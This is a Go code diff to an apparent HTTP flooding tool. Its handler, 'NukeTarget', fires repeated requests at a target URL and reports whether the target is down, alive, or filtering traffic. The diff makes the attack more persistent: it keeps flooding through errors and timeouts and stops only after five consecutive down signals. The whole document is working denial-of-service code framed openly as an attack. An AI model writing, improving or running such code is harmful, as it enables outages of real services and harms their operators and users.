@@ -5,12 +5,10 @@ import (
 	"context"
 	"encoding/json"
 	"io"
-	"log"
 	"net/http"
 	"os"
 	"syscall"
 
-	logw "github.com/andriiyaremenko/logwriter"
 	"github.com/andriiyaremenko/mg/client"
 	"github.com/andriiyaremenko/mg/dto"
 	"github.com/andriiyaremenko/tinycqs/command"
@@ -42,6 +40,7 @@ func NukeTarget(amountRequests int64) command.Handler {
 				return
 			}
 
+			hits := 0
 			for i := amountRequests; i > 0; i-- {
 				select {
 				case <-ctx.Done():
@@ -57,7 +56,7 @@ func NukeTarget(amountRequests int64) command.Handler {
 
 				req, err := http.NewRequest(target.Method, target.URL, body)
 				if err != nil {
-					log.Println(logw.Error, err)
+					w.Write(command.NewErrEvent(e, err))
 					return
 				}
 
@@ -68,11 +67,18 @@ func NukeTarget(amountRequests int64) command.Handler {
 				resp, err := client.Do(req)
 
 				if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
+					hits++
+
 					w.Write(command.E{
 						Type: "TARGET_DOWN",
 						P:    p,
 					})
-					return
+
+					if hits >= 5 {
+						return
+					}
+
+					continue
 				}
 
 				if errors.Is(err, io.EOF) || errors.Is(err, syscall.ECONNRESET) {
@@ -82,35 +88,46 @@ func NukeTarget(amountRequests int64) command.Handler {
 							errors.Wrap(err, "attack failed, target filters traffic"),
 						),
 					)
+
 					return
 				}
 
 				if err != nil {
 					w.Write(command.NewErrEvent(e, errors.Wrap(err, "request failed")))
-					return
+
+					continue
 				}
 
 				resp.Body.Close()
 
 				if resp.StatusCode == http.StatusServiceUnavailable ||
 					resp.StatusCode == http.StatusGatewayTimeout {
+					hits++
+
 					w.Write(command.E{
 						Type: "TARGET_DOWN",
 						P:    p,
 					})
 
-					return
+					if hits >= 5 {
+						return
+					}
+
+					continue
 				}
 
 				if resp.StatusCode < 300 {
+					hits = 0
+
 					w.Write(command.E{
 						Type: "TARGET_ALIVE",
 						P:    p,
 					})
 
-					return
+					continue
 				}
 
+				hits = 0
 				targetErr := dto.TargetError{
 					Target:  *target,
 					ErrCode: resp.StatusCode,
@@ -119,7 +136,8 @@ func NukeTarget(amountRequests int64) command.Handler {
 				b, err := json.Marshal(targetErr)
 				if err != nil {
 					w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target error record")))
-					return
+
+					continue
 				}
 
 				w.Write(command.E{
